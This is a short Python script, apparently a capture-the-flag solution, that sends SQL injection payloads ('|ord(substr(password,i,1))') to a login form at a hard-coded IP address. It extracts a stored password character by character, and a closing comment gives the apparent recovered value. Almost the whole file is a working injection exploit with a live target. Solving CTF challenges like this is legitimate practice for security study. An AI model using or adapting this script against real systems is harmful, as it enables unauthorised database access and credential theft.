import requests
import re

def req(flag, hi):
	url = "http://47.97.168.223/index.php"
	headers = {
	"Content-Type":"application/x-www-form-urlencoded"
	}
	data = "flag="+str(flag)+"&hi="+str(hi)
	r = requests.post(url = url, headers = headers, data = data)
	p = re.findall(r'ints\<\/grey\>\s\|\s(.*)\<br',r.content)
	print p[0]

flag = "0"
for i in range(1, 20):
    hi = "|ord(substr(password,{},1))".format(str(i))
    req(flag, hi)

# helloctfer23333